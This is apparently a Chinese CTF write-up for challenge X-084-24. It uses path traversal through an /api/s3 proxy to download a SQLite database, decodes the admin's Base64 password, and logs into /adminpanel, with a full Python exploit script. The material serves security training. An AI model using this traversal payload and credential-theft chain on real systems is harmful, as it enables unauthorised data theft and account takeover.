# X-084-24
## 题目描述

> Find the gold bucket. Hint: Search for hidden directories

## 知识点

- 反向代理/中转接口导致的路径穿越（Path Traversal）
- 开放/模拟 S3 存储桶对象直读（未做路径约束）
- 数据库敏感信息泄露（SQLite）
- 通过已泄露数据直接登录或间接提权（JWT/账号密码）

## 解题思路

- 观察图片加载：团队页面图片通过形如 `/api/s3/<文件名>` 的中转接口拉取。
- 猜测“隐藏目录”提示与存储桶/目录遍历相关，尝试对 `/api/s3` 进行路径穿越：
  - 关键请求：`/api/s3/%2e%2e%2fbackups%2Fmanapool.db`（`..%2f` 上一级目录 + 访问 `backups` 桶内的数据库）
  - 若成功，可直接下载 SQLite 数据库（用户表等敏感数据）。
- 用泄露的 DB 查询管理员账号（`isMaster=1`），拿到其 email 与（Base64 编码后的）密码；解码后得到明文密码。
- 使用拿到的密码进行登录。

## 解题步骤

1) 路径穿越读取数据库
- GET `http://ip32864/api/s3/%2e%2e%2fbackups%2Fmanapool.db`
- 返回体为 SQLite 文件（`application/octet-stream`），保存为 `manapool.db`。

2) 本地查询管理员账号与密码
- 用 `sqlite3`/Python 读取 `manapool.db`，查询：`SELECT email, password FROM users WHERE isMaster=1;`
- `password` 字段为 Base64；解码得到明文密码。
![image.png](https://x/x12132845985.png)
![image.png](https://x/x12132908007.png)
得到明文密码为 `NoENVMxjGK3N3kG`。
2) 登录获得 flag
使用 dirsearch 工具扫描到有一个 `/adminpanel` 路径，访问 `/adminpanel` 进行登录，输入上面得到的邮箱和密码：
![image.png](https://x/x12133411326.png)
成功获得 flag。

## EXP
```python
import requests, sqlite3, base64, re

BASE = "http://ip32864"
S3_TRAV = "/api/s3/%2e%2e%2fbackups%2Fmanapool.db"
DB_FILE = "manapool.db"

# 1) 下载数据库
r = requests.get(BASE + S3_TRAV)
open(DB_FILE, "wb").write(r.content)

# 2) 查管理员账号与密码
conn = sqlite3.connect(DB_FILE)
c = conn.cursor()
email, b64pwd = c.execute("SELECT email, password FROM users WHERE isMaster=1;").fetchone()
plain_pwd = base64.b64decode(b64pwd).decode()
conn.close()

# 3) 登录获取 JWT
login_json = {"email": email, "password": plain_pwd}
r = requests.post(BASE + "/api/auth", json=login_json)
token = r.json()["token"]

# 4) 携带 Cookie 访问管理员页面，提取 Flag
cookies = {"token": token}
r = requests.get(BASE + "/adminpanel/profile", headers={"Accept": "text/html"}, cookies=cookies)
flag = re.search(r"flag\{[^}]+\}", r.text).group(0)
print("FLAG:", flag)
```